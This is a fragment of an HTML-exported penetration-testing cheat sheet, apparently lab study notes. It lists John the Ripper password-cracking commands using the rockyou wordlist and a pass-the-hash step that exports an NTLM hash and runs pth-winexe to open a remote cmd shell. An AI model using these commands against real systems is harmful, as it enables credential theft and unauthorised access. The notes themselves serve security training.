51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>john $ip.pwdump`</div><div><br/></div><div>john --wordlist=/usr/share/wordlists/rockyou.txt hashes`</div><div><br/></div><div>john --rules --wordlist=/usr/share/wordlists/rockyou.txt`</div><div><br/></div><div>john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`</div></div><div><br/></div><div><ul><li><span style="font-size: 10pt;">JTR forced descrypt cracking with wordlist</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`john --format=descrypt --wordlist&nbsp;&nbsp;&nbsp;&nbsp;/usr/share/wordlists/rockyou.txt hash.txt`</div></div><div><div><br/></div><ul><li><span style="font-size: 10pt;">JTR forced descrypt brute force cracking</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`john --format=descrypt hash --show`</div></div><div><div><br/></div><ul><li><font style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Passing the Hash in Windows</span></font></li></ul></div><div><br/></div><div>&nbsp;&nbsp;&nbsp;&nbsp;- Use Metasploit to exploit one of the SMB servers in the labs.</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump the password hashes and attempt a pass-the-hash attack against another system:</div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`pth-winexe -U administrator //$ip cmd`</div></div><div><br/></div></body></html>